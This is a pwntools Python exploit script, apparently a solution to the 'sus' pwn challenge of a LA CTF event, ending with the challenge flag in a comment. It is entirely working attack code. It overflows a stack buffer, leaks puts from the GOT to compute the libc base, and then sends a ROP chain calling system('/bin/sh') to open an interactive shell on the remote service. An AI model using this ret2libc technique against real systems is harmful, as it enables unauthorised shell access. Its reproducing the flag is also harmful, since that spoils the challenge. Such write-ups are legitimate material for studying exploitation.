#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./sus_patched")
libc = ELF("./libc.so.6")
context.binary = exe

REMOTE_NC_CMD    = "nc chall.lac.tf 31284"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b main
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"A"*8*7 + p64(exe.got.puts) + b"A"*8 + p64(exe.plt.puts) + p64(exe.sym.main)

    r.sendline(payload)

    r.recvuntil(b"sus?\n")
    leak = u64(r.recvline()[:-1].ljust(8,b"\x00"))

    libc.address = leak - libc.sym.puts

    rop = ROP(libc)

    POP_RDI = p64(rop.rdi.address)
    POP_RSI = p64(rop.rsi.address)
    POP_RDX = p64(rop.rdx.address)
    RET = p64(rop.ret.address)

    payload = POP_RDI + p64(libc.binsh()) + POP_RSI + p64(0) + POP_RDX + p64(0) + RET + p64(libc.sym.system)

    r.sendline(b"A"*8*9 + payload)

    r.interactive()
    #lactf{amongsus_aek7d2hqhgj29v21}

if __name__ == "__main__":
    main()